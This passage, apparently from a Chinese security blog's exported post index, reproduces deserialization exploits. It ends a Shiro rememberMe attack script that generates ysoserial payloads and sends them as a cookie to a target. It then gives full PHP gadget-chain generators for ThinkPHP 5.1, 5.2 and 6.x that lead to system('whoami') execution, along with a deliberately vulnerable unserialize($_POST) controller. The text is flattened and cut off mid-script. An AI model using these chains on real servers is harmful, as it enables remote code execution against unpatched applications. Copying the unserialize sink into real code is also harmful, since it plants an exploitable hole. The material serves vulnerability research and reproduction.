\"{0}:{2}:{1}/net/iharder/base64/2.3.9/base64-2.3.9.jar:{1}/commons-io/commons-io/2.6/commons-io-2.6.jar:{1}/org/reflections/reflections/0.9.9/reflections-0.9.9.jar:{1}/com/google/guava/guava/15.0/guava-15.0.jar:{1}/com/google/code/findbugs/annotations/2.0.1/annotations-2.0.1.jar:{1}/org/jboss/shrinkwrap/resolver/shrinkwrap-resolver-api/2.1.1/shrinkwrap-resolver-api-2.1.1.jar:{1}/org/jboss/shrinkwrap/resolver/shrinkwrap-resolver-spi/2.1.1/shrinkwrap-resolver-spi-2.1.1.jar:{1}/org/jboss/shrinkwrap/resolver/shrinkwrap-resolver-api-maven/2.1.1/shrinkwrap-resolver-api-maven-2.1.1.jar:{1}/org/jboss/shrinkwrap/resolver/shrinkwrap-resolver-spi-maven/2.1.1/shrinkwrap-resolver-spi-maven-2.1.1.jar:{1}/org/jboss/shrinkwrap/resolver/shrinkwrap-resolver-api-maven-archive/2.1.1/shrinkwrap-resolver-api-maven-archive-2.1.1.jar:{1}/org/jboss/shrinkwrap/shrinkwrap-api/1.2.1/shrinkwrap-api-1.2.1.jar:{1}/org/jboss/shrinkwrap/resolver/shrinkwrap-resolver-impl-maven/2.1.1/shrinkwrap-resolver-impl-maven-2.1.1.jar:{1}/org/eclipse/aether/aether-api/0.9.0.M2/aether-api-0.9.0.M2.jar:{1}/org/eclipse/aether/aether-impl/0.9.0.M2/aether-impl-0.9.0.M2.jar:{1}/org/eclipse/aether/aether-spi/0.9.0.M2/aether-spi-0.9.0.M2.jar:{1}/org/eclipse/aether/aether-util/0.9.0.M2/aether-util-0.9.0.M2.jar:{1}/org/eclipse/aether/aether-connector-wagon/0.9.0.M2/aether-connector-wagon-0.9.0.M2.jar:{1}/org/apache/maven/maven-aether-provider/3.1.1/maven-aether-provider-3.1.1.jar:{1}/org/apache/maven/maven-model/3.1.1/maven-model-3.1.1.jar:{1}/org/apache/maven/maven-model-builder/3.1.1/maven-model-builder-3.1.1.jar:{1}/org/codehaus/plexus/plexus-component-annotations/1.5.5/plexus-component-annotations-1.5.5.jar:{1}/org/apache/maven/maven-repository-metadata/3.1.1/maven-repository-metadata-3.1.1.jar:{1}/org/apache/maven/maven-settings/3.1.1/maven-settings-3.1.1.jar:{1}/org/apache/maven/maven-settings-builder/3.1.1/maven-settings-builder-3.1.1.jar:{1}/org/codehaus/plexus/plexus-interpolation/1.19/plexus-interpolation-1.19.jar:{1}/org/codehaus/plexus/plexus-utils/3.0.15/plexus-utils-3.0.15.jar:{1}/org/sonatype/plexus/plexus-sec-dispatcher/1.3/plexus-sec-dispatcher-1.3.jar:{1}/org/sonatype/plexus/plexus-cipher/1.4/plexus-cipher-1.4.jar:{1}/org/apache/maven/wagon/wagon-provider-api/2.6/wagon-provider-api-2.6.jar:{1}/org/apache/maven/wagon/wagon-file/2.6/wagon-file-2.6.jar:{1}/org/apache/maven/wagon/wagon-http-lightweight/2.6/wagon-http-lightweight-2.6.jar:{1}/org/apache/maven/wagon/wagon-http-shared/2.6/wagon-http-shared-2.6.jar:{1}/org/jboss/shrinkwrap/resolver/shrinkwrap-resolver-impl-maven-archive/2.1.1/shrinkwrap-resolver-impl-maven-archive-2.1.1.jar:{1}/org/jboss/shrinkwrap/shrinkwrap-impl-base/1.2.1/shrinkwrap-impl-base-1.2.1.jar:{1}/org/jboss/shrinkwrap/shrinkwrap-spi/1.2.1/shrinkwrap-spi-1.2.1.jar:{1}/org/jboss/shrinkwrap/resolver/shrinkwrap-resolver-spi-maven-archive/2.1.1/shrinkwrap-resolver-spi-maven-archive-2.1.1.jar:{1}/org/eclipse/sisu/org.eclipse.sisu.plexus/0.0.0.M5/org.eclipse.sisu.plexus-0.0.0.M5.jar:{1}/org/sonatype/sisu/sisu-guice/3.1.0/sisu-guice-3.1.0-no_aop.jar:{1}/org/eclipse/sisu/org.eclipse.sisu.inject/0.0.0.M5/org.eclipse.sisu.inject-0.0.0.M5.jar:{1}/org/codehaus/plexus/plexus-compiler-javac/2.3/plexus-compiler-javac-2.3.jar:{1}/org/codehaus/plexus/plexus-compiler-api/2.3/plexus-compiler-api-2.3.jar:{1}/org/javassist/javassist/3.19.0-GA/javassist-3.19.0-GA.jar:{1}/commons-codec/commons-codec/1.9/commons-codec-1.9.jar:{1}/org/jenkins-ci/main/remoting/2.55/remoting-2.55.jar:{1}/org/jenkins-ci/constant-pool-scanner/1.2/constant-pool-scanner-1.2.jar:{1}/org/jboss/logging/jboss-logging/3.3.0.Final/jboss-logging-3.3.0.Final.jar:{1}/org/jboss/remoting/jboss-remoting/4.0.19.Final/jboss-remoting-4.0.19.Final.jar:{1}/org/jboss/xnio/xnio-api/3.3.4.Final/xnio-api-3.3.4.Final.jar:{1}/org/jboss/jboss-common-core/2.5.0.Final/jboss-common-core-2.5.0.Final.jar:{1}/org/jboss/xnio/xnio-nio/3.3.4.Final/xnio-nio-3.3.4.Final.jar:{1}/org/jboss/sasl/jboss-sasl/1.0.5.Final/jboss-sasl-1.0.5.Final.jar:{1}/org/jboss/remotingjmx/remoting-jmx/2.0.1.Final/remoting-jmx-2.0.1.Final.jar:{1}/org/jboss/logging/jboss-logging-processor/1.2.0.Final/jboss-logging-processor-1.2.0.Final.jar:{1}/org/jboss/jdeparser/jdeparser/1.0.0.Final/jdeparser-1.0.0.Final.jar:{1}/org/jboss/marshalling/jboss-marshalling/1.4.10.Final/jboss-marshalling-1.4.10.Final.jar:{1}/org/jboss/marshalling/jboss-marshalling-river/1.4.10.Final/jboss-marshalling-river-1.4.10.Final.jar:{1}/commons-collections/commons-collections/3.1/commons-collections-3.1.jar:{1}/org/beanshell/bsh/2.0b5/bsh-2.0b5.jar:{1}/com/mchange/c3p0/0.9.5.2/c3p0-0.9.5.2.jar:{1}/commons-logging/commons-logging/1.1.1/commons-logging-1.1.1.jar:{1}/org/apache/commons/commons-collections4/4.0/commons-collections4-4.0.jar:{1}/org/codehaus/groovy/groovy/2.3.9/groovy-2.3.9.jar:{1}/org/springframework/spring-core/4.1.4.RELEASE/spring-core-4.1.4.RELEASE.jar:{1}/org/springframework/spring-beans/4.1.4.RELEASE/spring-beans-4.1.4.RELEASE.jar:{1}/org/hibernate/hibernate-core/4.3.11.Final/hibernate-core-4.3.11.Final.jar:{1}/org/jboss/logging/jboss-logging-annotations/1.2.0.Beta1/jboss-logging-annotations-1.2.0.Beta1.jar:{1}/org/jboss/spec/javax/transaction/jboss-transaction-api_1.2_spec/1.0.0.Final/jboss-transaction-api_1.2_spec-1.0.0.Final.jar:{1}/dom4j/dom4j/1.6.1/dom4j-1.6.1.jar:{1}/xml-apis/xml-apis/1.0.b2/xml-apis-1.0.b2.jar:{1}/org/hibernate/common/hibernate-commons-annotations/4.0.5.Final/hibernate-commons-annotations-4.0.5.Final.jar:{1}/org/hibernate/javax/persistence/hibernate-jpa-2.1-api/1.0.0.Final/hibernate-jpa-2.1-api-1.0.0.Final.jar:{1}/antlr/antlr/2.7.7/antlr-2.7.7.jar:{1}/org/jboss/jandex/1.1.0.Final/jandex-1.1.0.Final.jar:{1}/org/springframework/spring-aop/4.1.4.RELEASE/spring-aop-4.1.4.RELEASE.jar:{1}/aopalliance/aopalliance/1.0/aopalliance-1.0.jar:{1}/net/sf/json-lib/json-lib/2.4/json-lib-2.4-jdk15.jar:{1}/commons-lang/commons-lang/2.5/commons-lang-2.5.jar:{1}/net/sf/ezmorph/ezmorph/1.0.6/ezmorph-1.0.6.jar:{1}/commons-fileupload/commons-fileupload/1.3/commons-fileupload-1.3.jar:{1}/org/apache/wicket/wicket-util/6.23.0/wicket-util-6.23.0.jar:{1}/org/apache/shiro/shiro-core/1.4.0/shiro-core-1.4.0.jar:{1}/org/apache/shiro/shiro-lang/1.4.0/shiro-lang-1.4.0.jar:{1}/org/apache/shiro/shiro-cache/1.4.0/shiro-cache-1.4.0.jar:{1}/org/apache/shiro/shiro-crypto-hash/1.4.0/shiro-crypto-hash-1.4.0.jar:{1}/org/apache/shiro/shiro-crypto-core/1.4.0/shiro-crypto-core-1.4.0.jar:{1}/org/apache/shiro/shiro-crypto-cipher/1.4.0/shiro-crypto-cipher-1.4.0.jar:{1}/org/apache/shiro/shiro-config-core/1.4.0/shiro-config-core-1.4.0.jar:{1}/org/apache/shiro/shiro-config-ogdl/1.4.0/shiro-config-ogdl-1.4.0.jar:{1}/org/apache/shiro/shiro-event/1.4.0/shiro-event-1.4.0.jar:~/.m2/repository/com/mchange/c3p0/0.9.5.2/c3p0-0.9.5.2.jar:{1}/com/mchange/mchange-commons-java/0.2.11/mchange-commons-java-0.2.11.jar:{1}/javax/servlet/javax.servlet-api/3.1.0/javax.servlet-api-3.1.0.jar:{1}/org/apache/myfaces/core/myfaces-impl/2.2.9/myfaces-impl-2.2.9.jar:{1}/org/apache/myfaces/core/myfaces-api/2.2.9/myfaces-api-2.2.9.jar:{1}/org/apache/geronimo/specs/geronimo-atinject_1.0_spec/1.0/geronimo-atinject_1.0_spec-1.0.jar:{1}/commons-digester/commons-digester/1.8/commons-digester-1.8.jar:{1}/xalan/xalan/2.7.2/xalan-2.7.2.jar:{1}/xalan/serializer/2.7.2/serializer-2.7.2.jar:{1}/rome/rome/1.0/rome-1.0.jar:{1}/jdom/jdom/1.0/jdom-1.0.jar:{1}/org/python/jython-standalone/2.5.2/jython-standalone-2.5.2.jar:{1}/rhino/js/1.7R2/js-1.7R2.jar:{1}/javassist/javassist/3.12.0.GA/javassist-3.12.0.GA.jar:{1}/org/jboss/weld/weld-core/1.1.33.Final/weld-core-1.1.33.Final.jar:{1}/org/jboss/weld/weld-api/1.1.Final/weld-api-1.1.Final.jar:{1}/org/jboss/weld/weld-spi/1.1.Final/weld-spi-1.1.Final.jar:{1}/javax/annotation/jsr250-api/1.0/jsr250-api-1.0.jar:{1}/org/jboss/spec/javax/interceptor/jboss-interceptors-api_1.1_spec/1.0.0.Beta1/jboss-interceptors-api_1.1_spec-1.0.0.Beta1.jar:{1}/org/slf4j/slf4j-ext/1.7.2/slf4j-ext-1.7.2.jar:{1}/ch/qos/cal10n/cal10n-api/0.7.7/cal10n-api-0.7.7.jar:{1}/org/jboss/interceptor/jboss-interceptor-core/2.0.0.Final/jboss-interceptor-core-2.0.0.Final.jar:{1}/org/jboss/interceptor/jboss-interceptor-spi/2.0.0.Final/jboss-interceptor-spi-2.0.0.Final.jar:{1}/javax/enterprise/cdi-api/1.0-SP1/cdi-api-1.0-SP1.jar:{1}/org/jboss/interceptor/jboss-interceptor-api/1.1/jboss-interceptor-api-1.1.jar:{1}/javax/inject/javax.inject/1/javax.inject-1.jar:{1}/javax/interceptor/javax.interceptor-api/3.1/javax.interceptor-api-3.1.jar:{1}/org/slf4j/slf4j-api/1.7.21/slf4j-api-1.7.21.jar:{1}/org/clojure/clojure/1.8.0/clojure-1.8.0.jar:{1}/com/vaadin/vaadin-server/7.7.14/vaadin-server-7.7.14.jar:{1}/com/vaadin/vaadin-sass-compiler/0.9.13/vaadin-sass-compiler-0.9.13.jar:{1}/org/w3c/css/sac/1.3/sac-1.3.jar:{1}/com/vaadin/external/flute/flute/1.3.0.gg2/flute-1.3.0.gg2.jar:{1}/com/vaadin/vaadin-shared/7.7.14/vaadin-shared-7.7.14.jar:{1}/org/jsoup/jsoup/1.8.3/jsoup-1.8.3.jar:{1}/org/mortbay/jasper/apache-el/8.0.27/apache-el-8.0.27.jar:{1}/com/nqzero/permit-reflect/0.3/permit-reflect-0.3.jar:{1}/com/nqzero/permit-reflect/0.3/permit-reflect-0.3.jar\".format(yso_path, mvn_home, jar_path) print(version) popen = subprocess.Popen(['java', '-cp', cmd2, \"ysoserial.GeneratePayload\", gadget, command],stdout=subprocess.PIPE) payload = popen.stdout.read() base64_ciphertext = encode(payload) try: r = requests.get(target, cookies={'rememberMe': base64_ciphertext.decode()}, timeout=10) JAR_FILE = '/Users/cengsiqi/Desktop/pentest/ysoserial-0.0.6-SNAPSHOT-all.jar' #r = requests.get(target, cookies={'rememberMe': base64_ciphertext.decode()}, timeout=10, proxies={'http':'127.0.0.1:8080'}) except Exception as e: print(e) 参考https://paper.seebug.org/shiro-rememberme-1-2-4/https://joychou.org/java/apache-shiro-java-deserialize-vulnerability.htmlhttps://blog.zsxsoft.com/post/35https://www.cnblogs.com/Ahanu/p/5051090.htmlhttp://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.htmlhttps://bling.kapsi.fi/blog/jvm-deserialization-broken-classldr.html","link":"/2019/09/20/shiro%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/"},{"title":"thinkphp 反序列化系列gadget 复现","text":"环境准备安装composer 123curl -sS https://getcomposer.org/installer | phpmv composer.phar /usr/local/bin/composercomposer config -g repo.packagist composer https://mirrors.aliyun.com/composer/ 安装对应版本的tp后，修改index controller的index方法 12345public function index(){ unserialize($_POST['payload']); return \"Over\";} ThinkPHP5.1.X安装tp 1234composer create-project --prefer-dist topthink/think tp5137cd tp5137vim composer.json # 把&quot;topthink/framework&quot;: &quot;5.1.*&quot;改成&quot;topthink/framework&quot;: &quot;5.1.37&quot;composer update think\\process\\pipes; think\\model\\concern\\Conversion 要进入红框逻辑 基本上扩展到调用任意类的任意方法 filter 所以如果实在要用input，就需要迂回即查找有哪些方法内部使用了input，可以找到param。不过 $name参数这里是刚才合并数组后第一个参数$this传回到input第二个参数后，会强制类型转换成string。所以要强行用input就要继续找其它调用input的方法，或者调用param的方法。这样input的第一个参数和第二个参数都可控了。 最后的payload 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313&lt;?php namespace think\\process\\pipes { class Windows { private $files = []; private $fileHandles = []; public function __destruct() { $this-&gt;close(); $this-&gt;removeFiles(); } public function close() { foreach ($this-&gt;fileHandles as $handle) { fclose($handle); } $this-&gt;fileHandles = []; } private function removeFiles() { foreach ($this-&gt;files as $filename) { if (file_exists($filename)) { @unlink($filename); } } $this-&gt;files = []; } public function setFile($value){ $this-&gt;files[] = $value; } } } namespace think\\model\\concern { trait Conversion{ protected $append = ['key' =&gt; array()]; public function toArray() { $item = []; $hasVisible = false; if (!empty($this-&gt;append)) { foreach ($this-&gt;append as $key =&gt; $name) { if (is_array($name)) { $relation = $this-&gt;getRelation($key); if (!$relation) { $relation = $this-&gt;getAttr($key); $relation-&gt;visible($name); } $item[$key] = $relation-&gt;append($name)-&gt;toArray(); } } } return $item; } public function toJson($options = JSON_UNESCAPED_UNICODE) { return json_encode($this-&gt;toArray(), $options); } public function __toString() { return $this-&gt;toJson(); } } trait RelationShip{ private $relation = []; public function getRelation($name = null) { if (is_null($name)) { return $this-&gt;relation; } elseif (array_key_exists($name, $this-&gt;relation)) { return $this-&gt;relation[$name]; } return; } public function setRelation($key, $relation){ $this-&gt;relation[$key] = $relation; } } trait Attribute{ private $filter; private $data = ['key' =&gt; '']; public function getAttr($name, &amp;$item = null){ try { $notFound = false; $value = $this-&gt;getData($name); } catch (InvalidArgumentException $e) { $notFound = true; $value = null; } return $value; } public function getData($name = null) { if (is_null($name)) { return $this-&gt;data; } elseif (array_key_exists($name, $this-&gt;data)) { return $this-&gt;data[$name]; } elseif (array_key_exists($name, $this-&gt;relation)) { return $this-&gt;relation[$name]; } throw new InvalidArgumentException('property not exists:' . static::class . '-&gt;' . $name); } public function setData($key, $value) { $this-&gt;data[$key] = $value; } } } namespace think{ class Request{ protected $mergeParam = True; protected $hook = ['visible' =&gt; '']; protected $param = ['payload'=&gt;array('whoami')]; //input的第一个参数 protected $config = ['var_ajax' =&gt; 'payload']; //var_ajax所对应值是input的第二个参数 protected $filter = ['system']; public function __call($method, $args){ #var_dump($this-&gt;hook[$method]); if (array_key_exists($method, $this-&gt;hook)) { array_unshift($args, $this); return call_user_func_array($this-&gt;hook[$method], $args); } throw new Exception('method not exists:' . static::class . '-&gt;' . $method); } public function input($data = [], $name = '', $default = null, $filter = '') { if (false === $name) { return $data; } $name = (string) $name; if ('' != $name) { if (strpos($name, '/')) { list($name, $type) = explode('/', $name); } $data = $this-&gt;getData($data, $name); if (is_null($data)) { return $default; } if (is_object($data)) { return $data; } } $filter = $this-&gt;getFilter($filter, $default); if (is_array($data)) { array_walk_recursive($data, [$this, 'filterValue'], $filter); if (version_compare(PHP_VERSION, '7.1.0', '&lt;')) { $this-&gt;arrayReset($data); } } else { $this-&gt;filterValue($data, $name, $filter); } } protected function getData(array $data, $name) { foreach (explode('.', $name) as $val) { if (isset($data[$val])) { $data = $data[$val]; } else { return; } } return $data; } protected function getFilter($filter, $default) { if (is_null($filter)) { $filter = []; } else { $filter = $filter ?: $this-&gt;filter; if (is_string($filter) &amp;&amp; false === strpos($filter, '/')) { $filter = explode(',', $filter); } else { $filter = (array) $filter; } } $filter[] = $default; return $filter; } private function filterValue(&amp;$value, $key, $filters) { #($filters, $value); $default = array_pop($filters); foreach ($filters as $filter) { if (is_callable($filter)) { $value = call_user_func($filter, $value); } } return $value; } public function param($name = '', $default = null, $filter = '') { if (!$this-&gt;mergeParam) { $method = $this-&gt;method(true); switch ($method) { case 'POST': $vars = $this-&gt;post(false); break; case 'PUT': case 'DELETE': case 'PATCH': $vars = $this-&gt;put(false); break; default: $vars = []; } $this-&gt;param = array_merge($this-&gt;param, $this-&gt;get(false), $vars, $this-&gt;route(false)); $this-&gt;mergeParam = true; } if (true === $name) { // 获取包含文件上传信息的数组 $file = $this-&gt;file(); $data = is_array($file) ? array_merge($this-&gt;param, $file) : $this-&gt;param; return $this-&gt;input($data, '', $default, $filter); } return $this-&gt;input($this-&gt;param, $name, $default, $filter); } public function isAjax($ajax = false) { $value = $this-&gt;server('HTTP_X_REQUESTED_WITH'); $result = 'xmlhttprequest' == strtolower($value) ? true : false; if (true === $ajax) { return $result; } $result = $this-&gt;param($this-&gt;config['var_ajax']) ? true : $result; $this-&gt;mergeParam = false; return $result; } public function server($name = '', $default = null) { if (empty($name)) { return $this-&gt;server; } else { $name = strtoupper($name); } return isset($this-&gt;server[$name]) ? $this-&gt;server[$name] : $default; } public function setHook($value){ $this-&gt;hook['visible'] = $value; } } abstract class Model { use model\\concern\\Attribute; use model\\concern\\RelationShip; use model\\concern\\Conversion; } } namespace think\\model { use think\\Model; class Pivot extends Model{} } namespace { $request = new think\\Request; $request-&gt;setHook(array($request, 'isAjax')); $conversion = new think\\model\\Pivot(); $conversion-&gt;setData('key', $request); $windows = new think\\process\\pipes\\Windows(); $windows-&gt;setFile($conversion); echo urlencode(serialize($windows)); } ThinkPHP5.2.X123composer create-project topthink/think=5.2.x-dev tp52xcd tp52x./think run 在复现在时候看到文章分析说tp5.2.x里面的$relation-&gt;visible($name);被删除掉了，所以没法用tp5.1.x的链。个人感觉其实说的不对，如下图所示，它还在只是被封装到了另外一个函数里面，变量依然可控，真正的原因应该是 Request 类的 __call 方法被被移除了。 至此，tp5.1和tp5.2从这里开始分叉，tp5.2.x就下来用的gadget是toArray中的getAttr 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204&lt;?php namespace think\\process\\pipes { class Windows { private $files = []; private $fileHandles = []; public function __destruct() { $this-&gt;close(); $this-&gt;removeFiles(); } public function close() { foreach ($this-&gt;fileHandles as $handle) { fclose($handle); } $this-&gt;fileHandles = []; } private function removeFiles() { foreach ($this-&gt;files as $filename) { if (file_exists($filename)) { @unlink($filename); } } $this-&gt;files = []; } public function setFile($value){ $this-&gt;files[] = $value; } } } namespace think\\model\\concern { trait Conversion{ protected $visable = ['key' =&gt; 'value']; public function toArray() { $item = []; $hasVisible = false; foreach ($this-&gt;visible as $key =&gt; $val) { if (is_string($val)) { if (strpos($val, '.')) { list($relation, $name) = explode('.', $val); $this-&gt;visible[$relation][] = $name; } else { $this-&gt;visible[$val] = true; $hasVisible = true; } unset($this-&gt;visible[$key]); } } foreach ($this-&gt;hidden as $key =&gt; $val) { if (is_string($val)) { if (strpos($val, '.')) { list($relation, $name) = explode('.', $val); $this-&gt;hidden[$relation][] = $name; } else { $this-&gt;hidden[$val] = true; } unset($this-&gt;hidden[$key]); } } // 合并关联数据 $data = array_merge($this-&gt;data, $this-&gt;relation); foreach ($data as $key =&gt; $val) { if ($val instanceof Model || $val instanceof ModelCollection) { // 关联模型对象 if (isset($this-&gt;visible[$key])) { $val-&gt;visible($this-&gt;visible[$key]); } elseif (isset($this-&gt;hidden[$key])) { $val-&gt;hidden($this-&gt;hidden[$key]); } // 关联模型对象 $item[$key] = $val-&gt;toArray(); } elseif (isset($this-&gt;visible[$key])) { $item[$key] = $this-&gt;getAttr($key); } elseif (!isset($this-&gt;hidden[$key]) &amp;&amp; !$hasVisible) { $item[$key] = $this-&gt;getAttr($key); } } return $item; } public function toJson($options = JSON_UNESCAPED_UNICODE) { return json_encode($this-&gt;toArray(), $options); } public function __toString() { return $this-&gt;toJson(); } } trait Attribute{ protected $strict = true; private $data = ['key' =&gt; 'whoami']; private $withAttr = ['key' =&gt; 'system']; protected function getValue(string $name, $value, bool $relation = false) { // 检测属性获取器 $fieldName = $this-&gt;getRealFieldName($name); //$method = 'get' . App::parseName($name, 1) . 'Attr'; if (isset($this-&gt;withAttr[$fieldName])) { if ($relation) { $value = $this-&gt;getRelationValue($name); } $closure = $this-&gt;withAttr[$fieldName]; $value = $closure($value, $this-&gt;data); } elseif (method_exists($this, $method)) { if ($relation) { $value = $this-&gt;getRelationValue($name); } $value = $this-&gt;$method($value, $this-&gt;data); } elseif (isset($this-&gt;type[$fieldName])) { // 类型转换 $value = $this-&gt;readTransform($value, $this-&gt;type[$fieldName]); } elseif ($this-&gt;autoWriteTimestamp &amp;&amp; in_array($fieldName, [$this-&gt;createTime, $this-&gt;updateTime])) { $value = $this-&gt;getTimestampValue($value); } elseif ($relation) { $value = $this-&gt;getRelationAttribute($name); } return $value; } public function getAttr(string $name) { try { $relation = false; $value = $this-&gt;getData($name); } catch (InvalidArgumentException $e) { $relation = true; $value = null; } return $this-&gt;getValue($name, $value, $relation); } public function getData(string $name = null) { if (is_null($name)) { return $this-&gt;data; } $fieldName = $this-&gt;getRealFieldName($name); if (array_key_exists($fieldName, $this-&gt;data)) { return $this-&gt;data[$fieldName]; } elseif (array_key_exists($name, $this-&gt;relation)) { return $this-&gt;relation[$name]; } throw new InvalidArgumentException('property not exists:' . static::class . '-&gt;' . $name); } protected function getRealFieldName(string $name): string { return $this-&gt;strict ? $name : App::parseName($name); } } trait RelationShip { private $relation = []; } } namespace think { abstract class Model { use model\\concern\\Attribute; use model\\concern\\Conversion; use model\\concern\\RelationShip; } } namespace think\\model { use think\\Model; class Pivot extends Model{} } namespace { $conversion = new think\\model\\Pivot(); //$conversion-&gt;__toString(); $windows = new think\\process\\pipes\\Windows(); $windows-&gt;setFile($conversion); echo urlencode(serialize($windows)); } ThinkPHP6.X123composer create-project --prefer-dist topthink/think=6.0.x-dev tp6xcd tp6x./think run ThinkPHP6.x 的代码移除了 think\\process\\pipes\\Windows 类，但POP链__toString 之后的 Gadget 仍然存在，所以再找一个可触发__toString的点即可。 vendor/topthink/think-orm/src/Model.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288&lt;?php namespace think{ abstract class Model{ use model\\concern\\ModelEvent; use model\\concern\\Attribute; use model\\concern\\TimeStamp; use model\\concern\\RelationShip; use model\\concern\\Conversion; private $lazySave = True; private $exists = True; private $force = True; protected $table = ''; protected $suffix = ''; public function __destruct() { if ($this-&gt;lazySave) { $this-&gt;save(); } } public function save(array $data = [], string $sequence = null): bool { if ($this-&gt;isEmpty() || false === $this-&gt;trigger('BeforeWrite')) { return false; } $result = $this-&gt;exists ? $this-&gt;updateData() : $this-&gt;insertData($sequence); return true; } public function isEmpty(): bool { return empty($this-&gt;data); } protected function updateData(): bool { // 事件回调 if (false === $this-&gt;trigger('BeforeUpdate')) { return false; } //$this-&gt;checkData(); // 获取有更新的数据 $data = $this-&gt;getChangedData(); if (empty($data)) { // 关联更新 if (!empty($this-&gt;relationWrite)) { $this-&gt;autoRelationUpdate(); } return true; } if ($this-&gt;autoWriteTimestamp &amp;&amp; $this-&gt;updateTime &amp;&amp; !isset($data[$this-&gt;updateTime])) { // 自动写入更新时间 $data[$this-&gt;updateTime] = $this-&gt;autoWriteTimestamp($this-&gt;updateTime); $this-&gt;data[$this-&gt;updateTime] = $data[$this-&gt;updateTime]; } // 检查允许字段 $allowFields = $this-&gt;checkAllowFields(); } protected function checkAllowFields(): array { if (empty($this-&gt;field)) { if (!empty($this-&gt;schema)) { $this-&gt;field = array_keys(array_merge($this-&gt;schema, $this-&gt;jsonType)); } else { //$query = $this-&gt;db(); $table = $this-&gt;table ? $this-&gt;table . $this-&gt;suffix : $query-&gt;getTable(); $this-&gt;field = $query-&gt;getConnection()-&gt;getTableFields($table); } return $this-&gt;field; } } public function setTable($table){ $this-&gt;table = $table; } } } namespace think\\model{ use think\\Model; class Pivot extends Model{} } namespace think\\model\\concern{ trait Attribute{ protected $strict = true; private $data = ['key' =&gt; 'whoami']; private $withAttr = ['key' =&gt; 'system']; protected $field = []; protected $schema = []; public function getChangedData(): array { $data = $this-&gt;force ? $this-&gt;data : array_udiff_assoc($this-&gt;data, $this-&gt;origin, function ($a, $b) { if ((empty($a) || empty($b)) &amp;&amp; $a !== $b) { return 1; } return is_object($a) || $a != $b ? 1 : 0; }); // 只读字段不允许更新 foreach ($this-&gt;readonly as $key =&gt; $field) { if (isset($data[$field])) { unset($data[$field]); } } return $data; } protected function getValue(string $name, $value, bool $relation = false) { // 检测属性获取器 $fieldName = $this-&gt;getRealFieldName($name); //$method = 'get' . App::parseName($name, 1) . 'Attr'; if (isset($this-&gt;withAttr[$fieldName])) { if ($relation) { $value = $this-&gt;getRelationValue($name); } $closure = $this-&gt;withAttr[$fieldName]; var_dump($closure, $value); $value = $closure($value, $this-&gt;data); } elseif (method_exists($this, $method)) { if ($relation) { $value = $this-&gt;getRelationValue($name); } $value = $this-&gt;$method($value, $this-&gt;data); } elseif (isset($this-&gt;type[$fieldName])) { // 类型转换 $value = $this-&gt;readTransform($value, $this-&gt;type[$fieldName]); } elseif ($this-&gt;autoWriteTimestamp &amp;&amp; in_array($fieldName, [$this-&gt;createTime, $this-&gt;updateTime])) { $value = $this-&gt;getTimestampValue($value); } elseif ($relation) { $value = $this-&gt;getRelationAttribute($name); } return $value; } public function getAttr(string $name) { try { $relation = false; $value = $this-&gt;getData($name); } catch (InvalidArgumentException $e) { $relation = true; $value = null; } return $this-&gt;getValue($name, $value, $relation); } public function getData(string $name = null) { if (is_null($name)) { return $this-&gt;data; } $fieldName = $this-&gt;getRealFieldName($name); if (array_key_exists($fieldName, $this-&gt;data)) { return $this-&gt;data[$fieldName]; } elseif (array_key_exists($name, $this-&gt;relation)) { return $this-&gt;relation[$name]; } throw new InvalidArgumentException('property not exists:' . static::class . '-&gt;' . $name); } protected function getRealFieldName(string $name): string { return $this-&gt;strict ? $name : App::parseName($name); } } trait ModelEvent{ protected $withEvent = false; protected function trigger(string $event): bool { if (!$this-&gt;withEvent) { return true; } } } trait TimeStamp{ protected $autoWriteTimestamp = False; } trait RelationShip { private $relation = []; } trait Conversion{ protected $visable = ['key' =&gt; 'value']; public function toArray() { $item = []; $hasVisible = false; foreach ($this-&gt;visible as $key =&gt; $val) { if (is_string($val)) { if (strpos($val, '.')) { list($relation, $name) = explode('.', $val); $this-&gt;visible[$relation][] = $name; } else { $this-&gt;visible[$val] = true; $hasVisible = true; } unset($this-&gt;visible[$key]); } } foreach ($this-&gt;hidden as $key =&gt; $val) { if (is_string($val)) { if (strpos($val, '.')) { list($relation, $name) = explode('.', $val); $this-&gt;hidden[$relation][] = $name; } else { $this-&gt;hidden[$val] = true; } unset($this-&gt;hidden[$key]); } } // 合并关联数据 $data = array_merge($this-&gt;data, $this-&gt;relation); foreach ($data as $key =&gt; $val) { if ($val instanceof Model || $val instanceof ModelCollection) { // 关联模型对象 if (isset($this-&gt;visible[$key])) { $val-&gt;visible($this-&gt;visible[$key]); } elseif (isset($this-&gt;hidden[$key])) { $val-&gt;hidden($this-&gt;hidden[$key]); } // 关联模型对象 $item[$key] = $val-&gt;toArray(); } elseif (isset($this-&gt;visible[$key])) { $item[$key] = $this-&gt;getAttr($key); } elseif (!isset($this-&gt;hidden[$key]) &amp;&amp; !$hasVisible) { $item[$key] = $this-&gt;getAttr($key); } } return $item; } public function toJson($options = JSON_UNESCAPED_UNICODE) { return json_encode($this-&gt;toArray(), $options); } public function __toString() { return $this-&gt;toJson(); } } } namespace { $model = new think\\model\\Pivot(); 